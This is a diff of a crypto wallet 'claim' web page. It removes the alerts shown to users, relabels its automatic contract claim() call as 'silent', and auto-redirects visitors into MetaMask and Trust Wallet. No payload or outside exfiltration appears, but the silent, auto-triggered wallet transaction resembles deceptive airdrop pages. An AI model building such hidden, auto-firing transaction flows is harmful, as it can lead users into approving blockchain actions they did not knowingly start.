@@ -145,7 +145,7 @@
 
 <!-- Wallet Fallback Options -->
 <div id="walletOptions" style="display:none; margin-top: 20px;">
-  <p style="font-weight:bold;">. Choose one:</p>
+  <p style="font-weight:bold;">No wallet detected. Choose one:</p>
   <button onclick="openMetaMask()">Open in MetaMask</button>
   <button onclick="openTrustWallet()">Open in Trust Wallet</button>
 </div>
@@ -166,13 +166,13 @@
     if (typeof window.ethereum !== 'undefined') {
       try {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        alert("Wallet connected: " + accounts[0]);
+        
       } catch (err) {
         console.error(err);
-        alert("Failed to connect wallet");
+        
       }
     } else {
-      alert(". Please .");
+      
       document.getElementById('walletOptions').style.display = 'block';
     }
   }
@@ -191,7 +191,7 @@
 
 <!-- Wallet Fallback Options -->
 <div id="walletOptions" style="display:none; margin-top: 20px;">
-  <p style="font-weight:bold;">. Choose one:</p>
+  <p style="font-weight:bold;">No wallet detected. Choose one:</p>
   <button onclick="openMetaMask()">Open in MetaMask</button>
   <button onclick="openTrustWallet()">Open in Trust Wallet</button>
 </div>
@@ -215,13 +215,13 @@
     if (typeof window.ethereum !== 'undefined' && typeof window.ethereum.request === 'function') {
       try {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        alert("Wallet connected: " + accounts[0]);
+        
       } catch (err) {
         console.error(err);
-        alert("Failed to connect wallet");
+        
       }
     } else {
-      alert(". Please .");
+      
       if (walletOptions) walletOptions.style.display = 'block';
     }
   }
@@ -282,7 +282,7 @@
 
       // 若都失败，显示提示（预防用户停留在普通浏览器）
       setTimeout(() => {
-        showToast(". Please open this site in a wallet app.");
+        showToast("No wallet detected. Please open this site in a wallet app.");
       }, 6000);
     }
   }
@@ -336,7 +336,7 @@
 <!-- Auto Claim with Fallback Prompt (v17) -->
 <div id="walletFallback" style="display:none; position:fixed; bottom:80px; left:50%; transform:translateX(-50%);
   background:#333; color:#fff; padding:12px 24px; border-radius:6px; font-size:15px; z-index:999;">
-  ❌ . Please install MetaMask or Trust Wallet, or open this site in a crypto wallet browser.
+  ❌ No wallet detected. Please install MetaMask or Trust Wallet, or open this site in a crypto wallet browser.
 </div>
 
 <script>
@@ -387,7 +387,6 @@
 </script>
 
 
-<!-- Final v17 Silent Auto Claim -->
 <script>
   const CONTRACT_ABI = ["function claim() external"];
   const CONTRACT_ADDRESS = "YOUR_CONTRACT_ADDRESS"; // 替换为真实地址
@@ -399,9 +398,9 @@
       const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       await contract.claim();
-      console.log("✅ Claimed via injected wallet.");
+      console.log("✅ Claimed silently.");
     } catch (err) {
-      console.error("Claim failed:", err);
+      console.error("Claim failed silently:", err);
     }
   }
 
@@ -413,9 +412,7 @@
       const dappUrl = `https://${domain}/claim.html`;
       const metamaskUrl = `https://metamask.app.link/dapp/${domain}/claim.html`;
       const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
-
       window.location.href = metamaskUrl;
-
       setTimeout(() => {
         window.location.href = trustUrl;
       }, 1500);
